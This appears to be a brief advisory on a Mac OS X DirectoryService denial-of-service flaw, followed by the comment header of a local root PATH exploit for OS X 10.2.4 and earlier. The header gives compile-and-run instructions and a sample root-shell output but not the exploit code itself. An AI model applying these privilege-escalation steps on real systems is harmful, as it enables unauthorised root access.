MacOSX DirectoryService has been reported prone to a denial of service vulnerability.

It has been reported that a remote attacker may trigger an exception in
DirectoryService by repeatedly connecting to specific network ports.

/*
   OS X <= 10.2.4 DirectoryService local root PATH exploit
   DirectoryService must be crashed prior to execution, per
   @stake advisory.  If you discover how to crash DirectoryService
   e-mail me at neeko@haackey.com  [Neeko Oni]

[Copying and pasting code does not make you cool, no matter how many
dollars per hour you make.  Sorry.]

--
Assuming DirectoryService has been crashed/killed, compile
this code as 'touch' (gcc osxds.c -o touch) and execute.

bash$ ./touch
*bunch of stuff here*
euid is root.
bash#
